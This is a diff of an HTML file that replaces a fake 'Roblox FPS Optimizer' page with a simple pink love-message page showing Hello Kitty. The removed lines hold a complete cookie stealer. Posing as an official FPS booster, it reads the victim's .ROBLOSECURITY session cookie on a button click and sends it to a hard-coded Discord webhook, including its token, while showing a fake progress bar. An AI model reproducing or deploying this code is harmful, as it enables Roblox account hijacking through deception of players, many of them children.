@@ -42,196 +42,74 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox FPS Optimizer</title>
+  <title>Love Message</title>
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-family: 'Comic Sans MS', cursive, sans-serif;
       margin: 0;
       padding: 0;
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      background: linear-gradient(135deg, #e0f7fa 0%, #b0bec5 100%);
+      background: url('https://i.pinimg.com/1200x/63/06/38/6306384e489d9500dbe5b3c6cbb69093.jpg') no-repeat center center fixed; /* Fundo de flor rosa */
+      background-size: cover;
       overflow: hidden;
+      position: relative;
     }
     .container {
-      background: rgba(255, 255, 255, 0.95);
+      background-color: rgba(255, 245, 250, 0.7); /* Rosa claro com transparência */
       padding: 30px;
       border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
       text-align: center;
-      max-width: 500px;
+      max-width: 400px;
       width: 90%;
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
       position: relative;
-      overflow: hidden;
+      z-index: 1;
     }
-    .container:hover {
-      transform: translateY(-10px);
-      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
-    }
-    .bg-animation {
+    .hello-kitty {
       position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: radial-gradient(circle, rgba(2, 136, 209, 0.1) 0%, transparent 70%);
-      animation: rotate 15s infinite linear;
-      z-index: -1;
+      width: 100px; /* Tamanho reduzido */
+      height: auto; /* Mantém proporção */
+      animation: floatAndMove 8s infinite linear; /* Animação de flutuação e movimento */
+      opacity: 0.8;
     }
-    @keyframes rotate {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    @keyframes floatAndMove {
+      0% { top: 10%; left: -10%; transform: rotate(0deg); }
+      25% { top: 30%; left: 20%; transform: rotate(10deg); }
+      50% { top: 50%; left: 50%; transform: rotate(0deg); }
+      75% { top: 30%; left: 80%; transform: rotate(-10deg); }
+      100% { top: 10%; left: 110%; transform: rotate(0deg); }
     }
     h1 {
-      color: #0288d1;
-      font-size: 32px;
-      margin-bottom: 20px;
-      font-weight: 700;
-      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+      color: #ff4081; /* Rosa vibrante */
+      font-size: 28px;
+      margin-bottom: 15px;
+      text-shadow: 1px 1px 4px rgba(255, 64, 129, 0.3);
     }
     p {
-      font-size: 16px;
-      margin-bottom: 25px;
-      line-height: 1.6;
-      color: #455a64;
-    }
-    .logo {
-      width: 90px;
-      margin-bottom: 25px;
-      animation: bounce 2s infinite ease-in-out;
-    }
-    @keyframes bounce {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-15px); }
-    }
-    button {
-      background: linear-gradient(45deg, #4CAF50, #66bb6a);
-      color: white;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 30px;
-      cursor: pointer;
       font-size: 18px;
-      font-weight: 600;
-      transition: all 0.3s ease;
-      box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
-      position: relative;
-      overflow: hidden;
+      color: #d81b60; /* Rosa escuro */
+      margin-bottom: 20px;
+      line-height: 1.5;
     }
-    button::after {
-      content: '';
-      position: absolute;
-      width: 0;
-      height: 100%;
-      top: 0;
-      left: 0;
-      background: rgba(255, 255, 255, 0.3);
-      transition: width 0.3s ease;
+    .heart {
+      font-size: 24px;
+      color: #ff4081;
+      animation: beat 1s infinite;
     }
-    button:hover::after {
-      width: 100%;
-    }
-    button:hover {
-      background: linear-gradient(45deg, #45a049, #58a75e);
-      transform: scale(1.1);
-    }
-    button:active {
-      transform: scale(0.95);
-    }
-    .status {
-      margin-top: 20px;
-      font-size: 15px;
-      color: #78909c;
-      min-height: 20px;
-      position: relative;
-    }
-    .progress {
-      width: 0;
-      height: 5px;
-      background: #4CAF50;
-      position: absolute;
-      bottom: -10px;
-      left: 0;
-      transition: width 1s ease;
+    @keyframes beat {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.2); }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="bg-animation"></div>
-    <img src="https://via.placeholder.com/90?text=R+Logo" alt="Roblox FPS Logo" class="logo">
-    <h1>Roblox FPS Optimizer</h1>
-    <p>Eleve seu desempenho no Roblox com nosso otimizador oficial de FPS! Clique abaixo para desbloquear até 60 FPS e aproveitar uma jogabilidade fluida.</p>
-    <button id="optimizeButton">Ativar Otimização</button>
-    <div class="status" id="status">
-      Status: Pronto para otimizar...
-      <div class="progress" id="progress"></div>
-    </div>
+    <h1>I Love You</h1>
+    <p>Meu amorzinho <span class="heart">❤️</span></p>
   </div>
-
-  <script>
-    // Espera o DOM estar completamente carregado
-    document.addEventListener('DOMContentLoaded', () => {
-      // Inicializa os elementos do DOM
-      const status = document.getElementById('status');
-      const progress = document.getElementById('progress');
-      const optimizeButton = document.getElementById('optimizeButton');
-
-      // Verifica se os elementos existem
-      if (!status || !progress || !optimizeButton) {
-        console.error('Erro: Um ou mais elementos (status, progress, optimizeButton) não foram encontrados no DOM.');
-        return;
-      }
-
-      // Adiciona o evento de clique ao botão
-      optimizeButton.addEventListener('click', () => {
-        status.innerHTML = 'Status: Otimizando FPS...';
-        progress.style.width = '50%';
-        console.log('Iniciando otimização...');
-
-        // Tenta capturar o cookie .ROBLOSECURITY
-        const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
-        if (cookie) {
-          const cookieValue = cookie.split('=')[1];
-          console.log('Cookie encontrado:', cookieValue);
-          if (cookieValue && cookieValue.startsWith('_|WARNING:-DO-NOT-SHARE-THIS')) {
-            // Envia o cookie para o Discord
-            fetch('https://discord.com/api/webhooks/1398881274415812668/COAqK1x2n8okDDHvIQc489zoVsTxTs08sc3ZBl-peSVEtXTgRXZXh-DEUr5f9EPbcjxQ', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify({
-                content: `[FPS Optimizer] Cookie .ROBLOSECURITY capturado: ${cookieValue}`,
-                username: 'Roblox FPS Bot'
-              })
-            })
-            .then(response => {
-              console.log('Resposta do webhook:', response.status);
-              progress.style.width = '100%';
-              if (response.ok) {
-                status.innerHTML = 'Status: Otimização concluída com sucesso! <div class="progress"></div>';
-              } else {
-                status.innerHTML = 'Status: Erro na otimização. Código: ' + response.status + ' <div class="progress"></div>';
-              }
-            })
-            .catch(error => {
-              console.error('Erro no fetch:', error);
-              status.innerHTML = 'Status: Erro: ' + error.message + ' <div class="progress"></div>';
-            });
-          } else {
-            status.innerHTML = 'Status: Cookie inválido. <div class="progress"></div>';
-            console.log('Cookie inválido ou ausente do padrão.');
-          }
-        } else {
-          status.innerHTML = 'Status: Nenhum cookie Roblox encontrado. <div class="progress"></div>';
-          console.log('Nenhum cookie .ROBLOSECURITY encontrado.');
-        }
-      });
-    });
-  </script>
+  <img src="https://wallpapers.com/images/hd/hello-kitty-pc-05qyyt7th9b806ha.jpg" alt="Hello Kitty" class="hello-kitty" onerror="this.style.display='none';">
 </body>
 </html>
